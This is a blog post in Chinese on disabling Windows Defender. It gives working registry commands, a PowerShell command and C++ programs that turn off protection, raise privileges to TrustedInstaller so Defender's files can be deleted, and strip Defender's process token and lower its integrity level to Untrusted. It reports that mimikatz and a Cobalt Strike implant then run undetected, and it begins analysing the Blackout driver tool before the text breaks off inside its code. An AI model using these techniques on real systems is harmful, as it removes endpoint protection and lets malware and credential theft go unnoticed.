              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>12 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着数字技术的日益进步，我们的生活、工作和娱乐越来越依赖于计算机和网络系统。然而，与此同时，恶意软件也日趋猖獗，寻求窃取信息、破坏系统或仅仅为了展现其能力。微软Windows，作为世界上最流行的操作系统，不断受到这些恶意软件的攻击。为了对抗这些潜在的威胁，微软推出了Windows Defender，一款集成于Windows内部的免费反恶意软件工具</p>
<p>本文将深入探讨如何与Windows Defender对抗，以及那些特殊手段是如何被利用来破坏或关闭Defender的。</p>
<h1 id="修改注册表关闭Defender"><a href="#修改注册表关闭Defender" class="headerlink" title="修改注册表关闭Defender"></a>修改注册表关闭Defender</h1><h2 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h2><p>打开注册表，在<code>HKLM\SOFTWARE\Policies\Microsoft\Windows Defender</code>键下有两个名为<code>DisableAntiSpyware</code>和<code>DisableAntiVirus</code>的值，当着两个值被置为1时表示关闭Windows Defender的反间谍软件和反病毒功能</p>
<p><img src="/WeakDefender/image-20230823121723961.png" alt="image-20230823121723961"></p>
<p><img src="/WeakDefender/image-20230823121730953.png" alt="image-20230823121730953"></p>
<p>​	</p>
<p>启用管理员权限打开cmd，执行如下命令修改注册表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t reg_dword /d 1 /f</span><br><span class="line">reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiVirus /t reg_dword /d 1 /f</span><br></pre></td></tr></table></figure>

<p><img src="/WeakDefender/image-20230823122459298.png" alt="image-20230823122459298"></p>
<p>修改完注册表后还需重启操作系统才算真正的关闭Defender。重启系统后，虽然defender看起来是正常运行的，但是我们上传一个CS马上去它也不会查杀</p>
<img src="WeakDefender/image-20230823122528707.png" alt="image-20230823122528707" style="zoom:67%;" />		



<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置注册表键值的函数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SetRegistryValue</span><span class="params">(HKEY hRootKey, LPCSTR subKey, LPCSTR valueName, DWORD data)</span> </span>&#123;</span><br><span class="line">    HKEY hKey;</span><br><span class="line">    <span class="comment">// 打开指定的注册表键</span></span><br><span class="line">    LONG result = <span class="built_in">RegOpenKeyEx</span>(hRootKey, subKey, <span class="number">0</span>, KEY_SET_VALUE, &amp;hKey);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;打开注册表键失败: &quot;</span> &lt;&lt; subKey &lt;&lt; <span class="string">&quot; 错误码: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置指定的注册表键值</span></span><br><span class="line">    result = <span class="built_in">RegSetValueEx</span>(hKey, valueName, <span class="number">0</span>, REG_DWORD, (BYTE*)&amp;data, <span class="built_in">sizeof</span>(DWORD));</span><br><span class="line">    <span class="comment">// 关闭注册表键</span></span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result != ERROR_SUCCESS) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;设置注册表值失败: &quot;</span> &lt;&lt; valueName &lt;&lt; <span class="string">&quot; 错误码: &quot;</span> &lt;&lt; result &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* subKey = <span class="string">&quot;SOFTWARE\\Policies\\Microsoft\\Windows Defender&quot;</span>;</span><br><span class="line">    <span class="comment">// 设置两个注册表键值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SetRegistryValue</span>(HKEY_LOCAL_MACHINE, subKey, <span class="string">&quot;DisableAntiSpyware&quot;</span>, <span class="number">1</span>) &amp;&amp;</span><br><span class="line">        <span class="built_in">SetRegistryValue</span>(HKEY_LOCAL_MACHINE, subKey, <span class="string">&quot;DisableAntiVirus&quot;</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;注册表键值设置成功!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;设置注册表键值失败.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Powershell关闭Defender实时保护"><a href="#Powershell关闭Defender实时保护" class="headerlink" title="Powershell关闭Defender实时保护"></a>Powershell关闭Defender实时保护</h1><p>执行如下Powershell命令可以关闭Windows Defender的实时保护</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-MpPreference</span> <span class="literal">-DisableRealtimeMonitoring</span> <span class="variable">$true</span></span><br></pre></td></tr></table></figure>

<p><img src="/WeakDefender/image-20230721173120971.png" alt="image-20230721173120971"></p>
<h1 id="提权至Trustedinstaller"><a href="#提权至Trustedinstaller" class="headerlink" title="提权至Trustedinstaller"></a>提权至Trustedinstaller</h1><h2 id="情景分析"><a href="#情景分析" class="headerlink" title="情景分析"></a>情景分析</h2><p>当我们使用system权限尝试删除WindowsDefender的某些核心文件时，会提示权限不足无法删除</p>
<p><img src="/WeakDefender/image-20230624203426837.png" alt="image-20230624203426837">	</p>
<p>这是因为修改WindowsDefender目录里的文件需要<code>TrustedInstaller</code>权限，而我们要做的是将<code>system</code>权限提升至<code>Trustedinstaller</code></p>
<img src="WeakDefender/image-20230625204420202.png" alt="image-20230625204420202" style="zoom:67%;" />	



<h2 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h2><p>使用开源的项目<a target="_blank" rel="noopener" href="https://github.com/0xbadjuju/Tokenvator">Tokenvator</a>将system权限提升至TrustedInstaller权限，执行如下命令后会弹出一个cmd shell, 查询其所在组可以发现权限为TrustedInstaller</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\Tokenvator.exe</span><br><span class="line">GetTrustedinstaller /Command:c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/WeakDefender/image-20230624204822742.png" alt="image-20230624204822742"></p>
<p>提升至Trustedinstaller权限后即可删除windowsdefender的核心文件</p>
<p><img src="/WeakDefender/image-20230624205722520.png" alt="image-20230624205722520"></p>
<h1 id="摘除Defender令牌"><a href="#摘除Defender令牌" class="headerlink" title="摘除Defender令牌"></a>摘除Defender令牌</h1><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p><code>MsMpEng.exe</code> 是 Microsoft Windows Defender 的核心进程，Windows Defender 是 Windows 操作系统自带的反病毒软件。此进程名称代表 Microsoft Malware Protection Engine，它负责在你的计算机上扫描、检测和移除恶意软件，通常此进程是加了PPL保护	</p>
<p><img src="/WeakDefender/image-20230624203033735.png" alt="image-20230624203033735"></p>
<p>​		</p>
<p>使用ProcessHacker查看<code>MsmpEng.exe</code>的完整级别为<code>system</code></p>
<blockquote>
<p>在Windows操作系统中，完整性级别是一个安全特性，它被设计用来防止低权限的进程影响高权限的进程。这是通过对进程和对象（如文件或注册表键）分配完整性级别来实现的。如果一个进程试图修改一个具有比其更高完整性级别的对象，操作将会失败</p>
<ul>
<li><strong>Untrusted (0x0000)</strong>: 这是最低的完整性级别，通常不会分配给进程。</li>
<li><strong>Low (0x1000)</strong>: 通常用于Web浏览器和其他可能处理不受信任输入的程序。这可以帮助防止恶意软件通过这些程序蔓延到系统的其它部分。</li>
<li><strong>Medium (0x2000)</strong>: 这是普通用户级别的进程默认的完整性级别。除非另有说明，否则大多数进程将运行在此级别。</li>
<li><strong>High (0x3000)</strong>: 这是管理员级别的进程的默认完整性级别。如果用户以管理员身份运行程序，那么该程序将运行在此级别。</li>
<li><strong>System (0x4000)</strong>: 此级别用于操作系统核心和核心模式驱动程序。</li>
<li><strong>Protected (0x5000)</strong>: 这是Windows 8引入的最高完整性级别，用于保护关键的系统进程。这个级别的进程有防篡改保护，并且只能由具有相同或更高完整性级别的进程访问</li>
</ul>
</blockquote>
<img src="WeakDefender/image-20230624212426260.png" alt="image-20230624212426260" style="zoom:67%;" />			



<p>如果我们将<code>MsmpEng.exe</code>的完整级别降为Untrusted, 那么该进程对计算机资源的访问将十分有限，由于WindowsDefender的核心服务需要某些令牌，降为Untursted级别后这些令牌都会被摘除掉。如下图所示，我将<code>msedge.exe</code>的integrity降为Untrusted后，edge浏览器就无法打开了</p>
<p><img src="/WeakDefender/image-20230624215809411.png" alt="image-20230624215809411">	</p>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><h3 id="1-开启Debug权限"><a href="#1-开启Debug权限" class="headerlink" title="1.开启Debug权限"></a>1.开启Debug权限</h3><p>通过<code>EnableDebugPrivilege</code>函数开启当前进程的Debug权限，Debug权限允许进程附加到其他进程上以进行调试，以下是<code>EnableDebugPrivilege</code>函数的定义：</p>
<ul>
<li>调用<code>OpenProcessToken</code>获取传入进程的访问令牌</li>
<li>获取到令牌后，函数调用<code>LookupPrivilegeValue</code>函数以获取<code>SE_DEBUG_NAME</code>特权的本地唯一标识符（LUID）</li>
<li>获取<code>SE_DEBUG_NAME</code>特权的LUID后，函数创建一个<code>TOKEN_PRIVILEGES</code>结构来表示要启用的特权，然后将SE_DEBUG_NAME特权的LUID和启用状态填入到此结构中</li>
<li>调用<code>AdjustTokenPrivileges</code>来调整之前打开的令牌，使其获得<code>SE_DEBUG_NAME</code>特权</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数EnableDebugPrivilege用于启用指定进程的调试权限</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">EnableDebugPrivilege</span><span class="params">(HANDLE ProcHandle, HANDLE* hToken)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LUID sedebugnameValue; <span class="comment">// LUID，用于表示系统特权</span></span><br><span class="line">    TOKEN_PRIVILEGES tkp; <span class="comment">// 令牌特权结构</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开当前进程的访问令牌</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(ProcHandle, TOKEN_ALL_ACCESS |</span><br><span class="line">        TOKEN_QUERY, hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找 SE_DEBUG_NAME 特权的 LUID</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(*hToken); <span class="comment">// 关闭令牌句柄</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>; <span class="comment">// 设置要调整的特权数量</span></span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue; <span class="comment">// 要启用的特权的 LUID</span></span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED; <span class="comment">// 启用该特权</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 调整访问令牌的特权</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">AdjustTokenPrivileges</span>(*hToken, FALSE, &amp;tkp, <span class="built_in">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 返回true表示成功启用调试特权</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-获取system权限的令牌"><a href="#2-获取system权限的令牌" class="headerlink" title="2.获取system权限的令牌"></a>2.获取system权限的令牌</h3><p>通过获取winlogon.exe进程（该进程以SYSTEM账户运行）的令牌并模拟该用户，这是为了获取到比当前用户更高的权限。</p>
<p>调用OpenProcessToken()函数获取winlogon.exe进程的令牌, 再调用ImpersonateLoggedOnUser函数将使用获取到的令牌模拟用户登录，如果成功，那么在此后的代码执行过程中，将使用该令牌所代表的用户权限。这里因为<code>winlogon.exe</code>通常是以SYSTEM用户身份运行的，所以相当于得到了SYSTEM的权限</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wchar_t</span> procname[<span class="number">80</span>] = <span class="string">L&quot;winlogon.exe&quot;</span>; <span class="comment">// 目标进程名称</span></span><br><span class="line"><span class="type">int</span> pid = <span class="built_in">getpid</span>(procname); <span class="comment">// 获取目标进程ID</span></span><br><span class="line">HANDLE phandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid); <span class="comment">// 打开目标进程</span></span><br><span class="line"></span><br><span class="line">HANDLE ptoken;</span><br><span class="line"><span class="built_in">OpenProcessToken</span>(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &amp;ptoken); <span class="comment">// 获取目标进程的访问令牌</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 尝试以目标用户身份运行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ImpersonateLoggedOnUser</span>(ptoken)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Impersonated System!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to impersonate System...\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 关闭句柄</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(phandle);</span><br><span class="line"><span class="built_in">CloseHandle</span>(ptoken);</span><br></pre></td></tr></table></figure>



<h3 id="3-降低令牌权限"><a href="#3-降低令牌权限" class="headerlink" title="3.降低令牌权限"></a>3.降低令牌权限</h3><p>以下代码的主要目的是获取<code>MsMpEng.exe</code>的句柄，启用该进程的调试特权，并通过<code>SetPrivilege()</code>函数移除<code>MsMpEng.exe</code>的大部分权限，这使得Windows Defender丧失了很多能力，包括加载驱动程序、更改系统环境、备份文件等</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重复上述步骤，但目标进程改为&quot;MsMpEng.exe&quot;</span></span><br><span class="line"><span class="type">wchar_t</span> procname2[<span class="number">80</span>] = <span class="string">L&quot;MsMpEng.exe&quot;</span>;</span><br><span class="line">pid = <span class="built_in">getpid</span>(procname2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Killing Defender...\n&quot;</span>);</span><br><span class="line">phandle = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);</span><br><span class="line"><span class="keyword">if</span> (phandle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Opened Target Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to open Process Handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">EnableDebugPrivilege</span>(phandle,&amp;ptoken);</span><br><span class="line"><span class="comment">// 以下一系列SetPrivilege调用移除了所有特定的权限</span></span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_DEBUG_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_TCB_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_IMPERSONATE_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_LOAD_DRIVER_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_RESTORE_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_BACKUP_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SECURITY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_SHUTDOWN_NAME, TRUE);</span><br><span class="line"><span class="built_in">SetPrivilege</span>(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Removed All Privileges\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="4-设置进程完整级别为Untrusted"><a href="#4-设置进程完整级别为Untrusted" class="headerlink" title="4.设置进程完整级别为Untrusted"></a>4.设置进程完整级别为Untrusted</h3><p>通过<code>SetTokenInformation()</code>函数将MsMpEng.exe的完整性级别设为Untrusted，这是最低的完整性级别，进一步限制了Windows Defender的能力</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置令牌完整性级别为 Untrusted</span></span><br><span class="line">DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;</span><br><span class="line">SID integrityLevelSid&#123;&#125;;</span><br><span class="line">integrityLevelSid.Revision = SID_REVISION;</span><br><span class="line">integrityLevelSid.SubAuthorityCount = <span class="number">1</span>;</span><br><span class="line">integrityLevelSid.IdentifierAuthority.Value[<span class="number">5</span>] = <span class="number">16</span>;</span><br><span class="line">integrityLevelSid.SubAuthority[<span class="number">0</span>] = integrityLevel;</span><br><span class="line">TOKEN_MANDATORY_LABEL tokenIntegrityLevel = &#123;&#125;;</span><br><span class="line">tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;</span><br><span class="line">tokenIntegrityLevel.Label.Sid = &amp;integrityLevelSid;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">SetTokenInformation</span>(</span><br><span class="line">    ptoken,</span><br><span class="line">    TokenIntegrityLevel,</span><br><span class="line">    &amp;tokenIntegrityLevel,</span><br><span class="line">    <span class="built_in">sizeof</span>(TOKEN_MANDATORY_LABEL) + <span class="built_in">GetLengthSid</span>(&amp;integrityLevelSid)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;SetTokenInformation failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Token Integrity set to Untrusted\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>在WindowsServer2019上，使用管理员权限执行<code>Kill_WindowsDefender.exe</code></p>
<p><img src="/WeakDefender/image-20230624232722573.png" alt="image-20230624232722573">	</p>
<p>随后用ProcespsHacker查看<code>MsMpEng.exe</code>的完整级别, 可以发现变成了<code>Untrusted</code></p>
<p><img src="WeakDefender/image-20230624231758421.png" alt="image-20230624231758421" style="zoom:67%;" />‘	</p>
<p>将WindowsDefender设置为<code>Untrusted</code>级别后，运行mimikatz也不会出现报毒现象</p>
<img src="WeakDefender/image-20230624233443342.png" alt="image-20230624233443342" style="zoom:67%;" />	



<p>但是这种方法只能在WindowsServer服务器上使用，无法在Windows10及以上版本使用</p>
<p><img src="/WeakDefender/image-20230625091215423.png" alt="image-20230625091215423">	</p>
<h1 id="加载驱动关闭Defender-blackout"><a href="#加载驱动关闭Defender-blackout" class="headerlink" title="加载驱动关闭Defender(blackout)"></a>加载驱动关闭Defender(blackout)</h1><h2 id="项目描述"><a href="#项目描述" class="headerlink" title="项目描述"></a>项目描述</h2><p>blackout项目地址：<a target="_blank" rel="noopener" href="https://github.com/ZeroMemoryEx/Blackout">https://github.com/ZeroMemoryEx/Blackout</a></p>
<p>Blackout 是一个工具，旨在利用gmer驱动程序来禁用或杀死 EDR 和 AV，特别是那些受到反恶意软件保护的进程。这个工具需要在管理员的上下文中运行，并且可以流畅地绕过 HVCI。</p>
<p>需将驱动程序 <code>Blackout.sys</code> 和可执行文件放于同一路径，随后使用命令 <code>Blackout.exe -p &lt;process_id&gt;</code> 运行</p>
<h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><p>此项目主要涉及两个关键的函数，分别是<code>LoadDriver</code>和<code>DeviceIoControl</code></p>
<p>首先我们来看下<code>LoadDriver</code>函数的定义，其目的是用于加载一个内核驱动。驱动的服务名称被命名为”Blackout”，随后使用<code>CreateServiceA</code> 创建一个新的内核驱动服务，并启动它</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function"><span class="title">LoadDriver</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span>* driverPath</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SC_HANDLE hSCM, hService;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* serviceName = <span class="string">&quot;Blackout&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open a handle to the SCM database</span></span><br><span class="line">    hSCM = <span class="built_in">OpenSCManager</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, SC_MANAGER_ALL_ACCESS);</span><br><span class="line">    <span class="keyword">if</span> (hSCM == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if the service already exists</span></span><br><span class="line">    hService = <span 